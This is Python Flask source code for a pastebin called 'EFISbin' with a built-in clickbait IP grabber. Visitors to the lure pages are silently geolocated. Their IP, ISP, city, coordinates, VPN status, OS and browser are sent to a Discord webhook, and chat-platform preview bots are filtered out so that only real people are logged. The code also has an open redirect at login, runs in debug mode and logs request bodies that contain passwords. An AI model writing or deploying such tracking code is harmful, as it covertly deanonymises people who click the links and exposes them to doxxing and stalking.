import logging
from logging.handlers import RotatingFileHandler
import os
import time
from datetime import datetime, timedelta
from functools import wraps

import httpagentparser
import requests
from dotenv import load_dotenv
from flask import Flask, render_template, redirect, url_for, request, flash, abort
from flask import send_from_directory
from flask_caching import Cache
from flask_compress import Compress
from flask_login import LoginManager, login_user, login_required, logout_user, current_user, UserMixin
from flask_sqlalchemy import SQLAlchemy
from flask_wtf import FlaskForm, RecaptchaField
from sqlalchemy.exc import OperationalError
from werkzeug.security import generate_password_hash, check_password_hash
from wtforms import StringField, PasswordField, SubmitField, TextAreaField, BooleanField
from wtforms.validators import DataRequired, Length, Email, EqualTo, ValidationError
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default_secret_key')
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'default_database_url')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['RECAPTCHA_PUBLIC_KEY'] = os.getenv('RECAPTCHA_PUBLIC_KEY')
app.config['RECAPTCHA_PRIVATE_KEY'] = os.getenv('RECAPTCHA_PRIVATE_KEY')
compress = Compress()
compress.init_app(app)
app.config['COMPRESS_MIMETYPES'] = [
    'text/html',
    'text/css',
    'text/xml',
    'application/json',
    'application/javascript'
]
app.config['COMPRESS_LEVEL'] = 6
app.config['COMPRESS_MIN_SIZE'] = 500

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'
cache = Cache(app, config={'CACHE_TYPE': 'simple'})

# ------------------ Configuration for EFISbin ------------------
CLICKBAIT_TITLE = "😱 SHOCK! You won't believe what's hidden here..."
CLICKBAIT_DESCRIPTION = "🔥 Exclusive! This was supposed to stay secret, but it leaked online. Check it out before it's deleted!"
CLICKBAIT_IMAGE = "https://example.com/image.png"
REAL_URL = "https://example.com/real"
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'default_webhook_url')
click_count = 0
# -------------------------------------------------------------

# Use environment variables
VPN_CHECK = int(os.getenv("VPN_CHECK", "1"))  # Default to 1 if not set
ANTI_BOT = int(os.getenv("ANTI_BOT", "1"))    # Default to 1 if not set
handler = RotatingFileHandler('app.log', maxBytes=10000, backupCount=3)
handler.setLevel(logging.INFO)
app.logger.addHandler(handler)

# Configuration for logging images
config = {
    "webhook": DISCORD_WEBHOOK_URL,
    "image": CLICKBAIT_IMAGE,
    "imageArgument": True,
    "username": "EFISbin",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Hello, world!",
        "richMessage": True,
    },
    "vpnCheck": VPN_CHECK,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": ANTI_BOT,
    "redirect": {
        "redirect": True,
        "page": REAL_URL
    },
}

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "EFISbin - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log IP!\n\n**Error:**\n\n{error}\n",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "EFISbin - Link Sent",
                    "color": config["color"],
                    "description": f"EFISbin link was sent to chat!\nYou might get the IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857")
        response.raise_for_status()  # Raise an exception for HTTP errors
        info = response.json()

        if 'proxy' in info and info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""

        if 'hosting' in info and info["hosting"]:
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return
            if config["antiBot"] == 3:
                return
            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""
            if config["antiBot"] == 1:
                ping = ""

        os, browser = httpagentparser.simple_detect(useragent)

        timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
        timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
        timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "EFISbin - IP Logged",
                    "color": config["color"],
                    "description": f"""**User opened the original image!**

**Endpoint:** `{endpoint}`

**IP Information:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coordinates:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Exact, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{timezone_name}` ({timezone_region})
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Information:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
                }
            ],
        }

        if url:
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json=embed)
        return info

    except requests.exceptions.RequestException as e:
        logging.error(f"Error processing IP information: {e}")
        return
    except ValueError as e:
        logging.error(f"Error parsing JSON: {e}")
        return

# Function to log IP
def ip_logger(event="New Visit", custom_data=None):
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    content = f"🚨 {event}!\n**IP:** {user_ip}\n**User-Agent:** {user_agent}\n**Referrer:** {referrer}"

    if custom_data:
        content += f"\n**Additional Data:** {custom_data}"

    payload = {"content": content}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print("Error sending Discord webhook:", e)

# User model
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    email = db.Column(db.String(150), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)  # Admin flag
    is_banned = db.Column(db.Boolean, default=False)  # Ban flag
    hardware_id = db.Column(db.String(256), unique=True, nullable=True)  # Hardware ID
    pastes = db.relationship('Paste', backref='author', lazy=True)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_admin:
            flash("You do not have access to this page.", "danger")
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

# Paste model
class Paste(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(150))
    content = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    is_anonymous = db.Column(db.Boolean, default=False)  # Anonymous post

class AdminLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    admin_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    action = db.Column(db.String(256), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    details = db.Column(db.Text, nullable=True)

# Clickbait model
class Clickbait(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False)  # New field
    title = db.Column(db.String(256), nullable=False)
    description = db.Column(db.String(512), nullable=False)
    image_url = db.Column(db.String(512), nullable=False)
    real_url = db.Column(db.String(512), nullable=False)

@login_manager.user_loader
def load_user(user_id):
    with app.app_context():
        return db.session.get(User, int(user_id))

# Registration form
class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(3, 150)])
    email = StringField('Email', validators=[DataRequired(), Email(), Length(max=150)])
    password = PasswordField('Password', validators=[DataRequired(), Length(6, 100)])
    confirm_password = PasswordField('Confirm Password', validators=[DataRequired(), EqualTo('password')])
    recaptcha = RecaptchaField()
    submit = SubmitField('Register')

    def validate_username(self, username):
        user = User.query.filter_by(username=username.data).first()
        if user:
            raise ValidationError('This username is already taken. Please choose another.')

    def validate_email(self, email):
        user = User.query.filter_by(email=email.data).first()
        if user:
            raise ValidationError('This email is already registered.')

# Login form
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(3, 150)])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Login')

# Paste form
class PasteForm(FlaskForm):
    title = StringField('Title', validators=[Length(max=150)])
    content = TextAreaField('Content', validators=[DataRequired()])
    is_anonymous = BooleanField('Anonymous Post')
    submit = SubmitField('Create Paste')

# Edit paste form
class EditPasteForm(FlaskForm):
    title = StringField('Title', validators=[Length(max=150)])
    content = TextAreaField('Content', validators=[DataRequired()])
    submit = SubmitField('Save Changes')

# Clickbait form
class ClickbaitForm(FlaskForm):
    slug = StringField('Custom Name/Slug', validators=[DataRequired(), Length(max=100)])
    title = StringField('Title', validators=[DataRequired(), Length(max=256)])
    description = StringField('Description', validators=[DataRequired(), Length(max=512)])
    image_url = StringField('Image URL', validators=[DataRequired(), Length(max=512)])
    real_url = StringField('Real URL', validators=[DataRequired(), Length(max=512)])
    submit = SubmitField('Save')

    def validate_slug(self, slug):
        clickbait = Clickbait.query.filter_by(slug=slug.data).first()
        if clickbait:
            raise ValidationError('This slug is already taken. Please choose another.')

limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day", "50 per hour"])

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

# Main page: list of latest pastes
@app.route('/sitemap.xml')
def sitemap():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'sitemap.xml')

@app.route('/robots.txt')
def robots():
    return send_from_directory(os.path.join(app.root_path, 'static'), 'static/robots.txt')

@app.before_request
def log_request_info():
    app.logger.info('Headers: %s', request.headers)
    app.logger.info('Body: %s', request.get_data())

@app.after_request
def add_header(response):
    if request.path.startswith('/static/'):
        response.cache_control.max_age = 31536000  # 1 year
        response.cache_control.public = True
        response.headers['Expires'] = (datetime.now() + timedelta(days=365)).strftime('%a, %d %b %Y %H:%M:%S GMT')
    return response

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

@app.route('/')
@cache.cached(timeout=60)
def index():
    pastes = Paste.query.order_by(Paste.created_at.desc()).all()
    return render_template('index.html', pastes=pastes)

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

@app.route('/apple-touch-icon.png')
@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                              'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/offline')
def offline():
    return render_template('offline.html')

# ---------------------- Admin Panel ----------------------
@app.route('/admin')
@login_required
@admin_required
def admin_panel():
    return render_template('admin.html')

# Manage users: list of all users
@app.route('/admin/users')
@login_required
@admin_required
def admin_users():
    users = User.query.all()
    return render_template('admin_users.html', users=users)

# Manage pastes: list of all pastes
@app.route('/admin/pastes')
@login_required
@admin_required
def admin_pastes():
    pastes = Paste.query.order_by(Paste.created_at.desc()).all()
    return render_template('admin_pastes.html', pastes=pastes)

# Manage clickbaits
@app.route('/admin/clickbait', methods=['GET', 'POST'])
@login_required
@admin_required
def admin_clickbait():
    clickbaits = Clickbait.query.all()
    return render_template('admin_clickbait.html', clickbaits=clickbaits)

@app.route('/admin/clickbait/delete/<int:cb_id>', methods=['POST'])
@login_required
@admin_required
def delete_clickbait(cb_id):
    clickbait = Clickbait.query.get_or_404(cb_id)
    db.session.delete(clickbait)
    db.session.commit()
    flash('Clickbait successfully deleted', 'success')
    return redirect(url_for('admin_clickbait'))

@app.route('/admin/clickbait/new', methods=['GET', 'POST'])
@login_required
@admin_required
def new_clickbait():
    form = ClickbaitForm()
    if form.validate_on_submit():
        clickbait = Clickbait(
            slug=form.slug.data,
            title=form.title.data,
            description=form.description.data,
            image_url=form.image_url.data,
            real_url=form.real_url.data
        )
        db.session.add(clickbait)
        db.session.commit()
        flash("New clickbait created", "success")
        return redirect(url_for('admin_clickbait'))
    return render_template('new_clickbait.html', form=form)

# Edit clickbait
@app.route('/admin/clickbait/edit/<int:cb_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def edit_clickbait(cb_id):
    clickbait = Clickbait.query.get_or_404(cb_id)
    form = ClickbaitForm(obj=clickbait)
    if form.validate_on_submit():
        form.populate_obj(clickbait)
        db.session.commit()
        flash("Clickbait updated", "success")
        return redirect(url_for('admin_clickbait'))
    return render_template('edit_clickbait.html', form=form, clickbait=clickbait)

@app.route('/clickbait/<slug>')
def clickbait_page(slug):
    global click_count
    click_count += 1

    clickbait = Clickbait.query.filter_by(slug=slug).first_or_404()

    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    makeReport(user_ip, user_agent, endpoint=request.path)

    return render_template('clickbait.html',
                           clickbait_title=clickbait.title,
                           clickbait_description=clickbait.description,
                           clickbait_image=clickbait.image_url,
                           real_url=clickbait.real_url)

@app.route('/clickbait-list')
def clickbait_list():
    clickbaits = Clickbait.query.all()
    return render_template('clickbait_list.html', clickbaits=clickbaits)

# Admin functions for managing clickbait (statistics and reset counter)
@app.route('/admin/clickbait/reset', methods=['POST'])
@login_required
@admin_required
def reset_clickbait():
    global click_count
    click_count = 0
    flash("Click counter reset.", "success")
    return redirect(url_for('admin_clickbait'))

# Manage user bans
@app.route('/admin/ban/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def ban_user(user_id):
    user = db.session.get(User, user_id)
    if user:
        user.is_banned = True
        db.session.commit()
        flash(f"User {user.username} banned.", "success")
    return redirect(url_for('admin_users'))

@app.route('/admin/unban/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def unban_user(user_id):
    user = db.session.get(User, user_id)
    if user:
        user.is_banned = False
        db.session.commit()
        flash(f"User {user.username} unbanned.", "success")
    return redirect(url_for('admin_users'))

# Manage paste deletion
@app.route('/admin/paste/delete/<int:paste_id>', methods=['POST'])
@login_required
@admin_required
def delete_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if paste:
        db.session.delete(paste)
        db.session.commit()
        flash("Paste successfully deleted.", "success")
    return redirect(url_for('admin_pastes'))

# View admin logs
@app.route('/admin/logs')
@login_required
@admin_required
def admin_logs():
    logs = AdminLog.query.order_by(AdminLog.timestamp.desc()).all()
    return render_template('admin_logs.html', logs=logs)

@app.route('/admin/paste/edit/<int:paste_id>', methods=['GET', 'POST'])
@login_required
@admin_required
def edit_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if not paste:
        abort(404)
    form = EditPasteForm(obj=paste)
    if form.validate_on_submit():
        paste.title = form.title.data
        paste.content = form.content.data
        db.session.commit()

        # Log the action
        log = AdminLog(admin_id=current_user.id, action=f"Edited paste ID: {paste_id}", details=f"Title: {paste.title}, Content: {paste.content}")
        db.session.add(log)
        db.session.commit()

        flash("Paste successfully edited.", "success")
        return redirect(url_for('admin_pastes'))
    return render_template('edit_paste.html', form=form, paste=paste)

@app.route('/paste/request_edit/<int:paste_id>', methods=['GET', 'POST'])
@login_required
def request_edit_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if not paste:
        abort(404)
    if not current_user.is_admin and paste.user_id != current_user.id:
        flash("You do not have permission to edit this paste.", "danger")
        return redirect(url_for('index'))
    form = EditPasteForm(obj=paste)
    if form.validate_on_submit():
        paste.title = form.title.data
        paste.content = form.content.data
        db.session.commit()

        # Log the action
        if current_user.is_admin:
            log = AdminLog(admin_id=current_user.id, action=f"Edited paste ID: {paste_id}", details=f"Title: {paste.title}, Content: {paste.content}")
            db.session.add(log)
            db.session.commit()

        flash("Paste successfully edited.", "success")
        return redirect(url_for('view_paste', paste_id=paste.id))
    return render_template('edit_paste.html', form=form, paste=paste)

# ------------------- Clickbait Functions --------------------
# Generate clickbait link
@app.route('/clickbait/generate')
def generate_link():
    clickbait = Clickbait.query.first()
    if clickbait:
        return f"Here is your clickbait link: {url_for('clickbait_page', _external=True)}"
    else:
        return "Clickbait not configured.", 404

# Registration page
@app.route('/register', methods=['GET', 'POST'])
@limiter.limit("5 per minute")  # Limit registration to 5 requests per minute
def register():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(username=form.username.data, email=form.email.data)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('Registration successful! Please log in.', 'success')
        return redirect(url_for('login'))
    return render_template('register.html', form=form)

# Login page
@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.check_password(form.password.data):
            if user.is_banned:
                flash("Your account is banned.", "danger")
                return redirect(url_for('login'))
            login_user(user)
            flash('You have successfully logged in.', 'success')
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('index'))
        else:
            flash('Invalid username or password.', 'danger')
    return render_template('login.html', form=form)

# Logout
@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('index'))

# Create a new paste (for authenticated users only)
@app.route('/create', methods=['GET', 'POST'])
@login_required
def create_paste():
    form = PasteForm()
    if form.validate_on_submit():
        paste = Paste(title=form.title.data, content=form.content.data, author=current_user, is_anonymous=form.is_anonymous.data)
        db.session.add(paste)
        db.session.commit()
        flash('New Paste created successfully!', 'success')
        return redirect(url_for('index'))
    return render_template('create.html', form=form)

# View a specific paste
@app.route('/paste/<int:paste_id>')
def view_paste(paste_id):
    paste = db.session.get(Paste, paste_id)
    if not paste:
        abort(404)
    return render_template('paste.html', paste=paste)

def create_tables():
    retries = 5
    while retries > 0:
        try:
            db.create_all()
            print("Tables created successfully.")
            break
        except OperationalError as e:
            print(f"OperationalError: {e}")
            retries -= 1
            if retries > 0:
                print("Retrying connection...")
                time.sleep(2)  # Wait before retrying
            else:
                print("Failed to connect to the database after several attempts.")
                raise

if __name__ == '__main__':
    with app.app_context():
        create_tables()  # Создание таблиц перед запуском
    app.run(debug=True)